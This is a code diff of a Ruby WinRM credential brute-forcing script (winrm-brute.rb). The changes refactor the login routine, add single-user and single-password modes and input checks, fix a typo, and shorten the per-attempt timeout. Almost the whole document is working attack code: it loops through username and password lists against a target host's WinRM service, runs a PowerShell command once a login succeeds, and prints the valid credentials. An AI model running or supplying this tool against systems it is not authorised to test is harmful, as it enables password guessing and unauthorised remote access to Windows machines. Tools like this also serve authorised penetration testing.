@@ -36,10 +36,52 @@ class String
   end
 end
 
+# Try to login and run a simple command
+def try_login(config)
+  conn = WinRM::Connection.new(config)
+  #conn.logger.level = :debug
+  begin
+    conn.shell(:powershell) do |shell|
+      output = shell.run('$PSVersionTable') do |stdout, stderr|
+        #STDOUT.print stdout
+        #STDERR.print stderr
+      end
+      #puts "The script exited with exit code #{output.exitcode}"
+    end
+  # Silently ignore authorization error
+  rescue WinRM::WinRMAuthorizationError
+  # Catch all other exceptions
+  rescue => e
+    puts "Caught exception #{e}: #{e.message}"
+  # No exception means success
+  else
+    return {:user => config[:user], :password => config[:password]}
+  end
+  return nil
+end
+
+# Print a message to show login attempt
+def print_attempt(config, quiet)
+  puts "Trying #{config[:user]}:#{config[:password]}" unless quiet
+end
+
+# Print valid credentials
+def check_creds(credentials)
+  if credentials
+    puts "[SUCCESS] user: #{credentials[:user]} password: #{credentials[:password]}".green
+  end
+end
+
+# Set a trap to avoid error messages on Ctrl+C
+trap "SIGINT" do
+  STDERR.puts "Execution interrupted by user"
+  exit 130
+end
+
 options = OpenStruct.new
 options.uri = "/wsman"
 options.port = "5985"
-options.timeout = 2
+options.timeout = 1
 
 optparse = OptionParser.new do |opts|
   opts.banner = "Usage: winrm-brute.rb [options]"
@@ -47,7 +89,7 @@ optparse = OptionParser.new do |opts|
 
   opts.on("-u USER",
           "A specific username to authenticate as") do |user|
-    ptions.user = user
+    options.user = user
   end
 
   opts.on("-U USERFILE",
@@ -66,7 +108,7 @@ optparse = OptionParser.new do |opts|
   end
 
   opts.on("-t TIMEOUT",
-          "Timeout for each attempt, in seconds (default: 2)") do |timeout|
+          "Timeout for each attempt, in seconds (default: 1)") do |timeout|
     options.timeout = timeout
   end
 
@@ -90,16 +132,32 @@ optparse = OptionParser.new do |opts|
     exit
   end
 end
+
+# If no arguments are given, show help
+if ARGV.empty?
+  puts optparse
+  exit
+end
+
 optparse.parse!
 
+# Check if some username was given
+if not (options.user or options.userfile)
+  puts "You must define at least one of -u or -U options".red
+  puts optparse
+  exit(-1)
+end
+
+# Check if some password was given
+if not (options.passwd or options.passwdfile)
+  puts "You must define at least one of -p or -P options".red
+  puts optparse
+  exit(-1)
+end
 
 # Check if host was provided
 if ARGV.empty?
   puts "You must specify a target host!".red
-  puts optparse
-  exit(-1)
-elsif not (options.passwdfile and options.userfile)
-  puts "You must specify at least a pair of username and password".red
   puts optparse
   exit(-1)
 end
@@ -113,27 +171,37 @@ auth = {
   retry_limit: 1
 }
 
-# Run for a specific
-File.readlines(options.userfile, chomp: true).each do |user|
-  File.readlines(options.passwdfile, chomp: true).each do |passwd|
-    puts "Trying #{user}:#{passwd}" unless options.quiet
+# Run for a specific user
+if options.user
+  auth[:user] = options.user
+  if options.passwd
+    auth[:password] = options.passwd
+    print_attempt(auth, options.quiet)
+    check_creds(try_login(auth))
+  end
+  if options.passwdfile
+    File.readlines(options.passwdfile, chomp: true).each do |p|
+      auth[:password] = p
+      print_attempt(auth, options.quiet)
+      check_creds(try_login(auth))
+    end
+  end
+end
+
+if options.userfile
+  File.readlines(options.userfile, chomp: true).each do |user|
     auth[:user] = user
-    auth[:password] = passwd
-    conn = WinRM::Connection.new(auth)
-    #conn.logger.level = :debug
-    begin
-      conn.shell(:powershell) do |shell|
-        output = shell.run('$PSVersionTable') do |stdout, stderr|
-          #STDOUT.print stdout
-          #STDERR.print stderr
-        end
-        #puts "The script exited with exit code #{output.exitcode}"
+    if options.passwd
+      auth[:password] = options.passwd
+      print_attempt(auth, options.quiet)
+      check_creds(try_login(auth))
+    end
+    if options.passwdfile
+      File.readlines(options.passwdfile, chomp: true).each do |passwd|
+        auth[:password] = passwd
+        print_attempt(auth, options.quiet)
+        check_creds(try_login(auth))
       end
-    rescue WinRM::WinRMAuthorizationError
-    rescue => e
-      puts "Caught exception #{e}"
-    else
-      puts "[SUCCESS] user: #{user} password: #{passwd}".green
     end
   end
 end
